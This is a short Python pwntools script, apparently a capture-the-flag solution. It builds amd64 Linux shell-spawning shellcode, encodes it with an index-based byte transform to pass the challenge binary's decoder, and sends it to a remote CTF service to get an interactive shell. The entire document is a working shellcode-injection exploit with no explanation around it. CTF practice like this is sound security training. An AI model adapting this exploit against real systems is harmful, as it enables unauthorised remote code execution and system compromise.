from pwn import *

elf = ELF('shellcoded')
context.update(os='linux', arch='amd64', binary=elf)

shellcode = asm(shellcraft.amd64.linux.sh())
new_shellcode = [b for b in shellcode]

for i, b in enumerate(shellcode):
	if i & 1:
		m = 1
	else:
		m = -1
	b += m * i
	if b > 255:
		b -= 256
	elif b < 0:
		b += 256
	new_shellcode[i] = b

new_shellcode = bytes(new_shellcode)

host = 'challenge.ctf.games'
port = 32383

if args.LOCAL:
	p = elf.process()
else:
	p = remote(host, port)


p.recvline()

p.sendline(new_shellcode)

p.interactive()

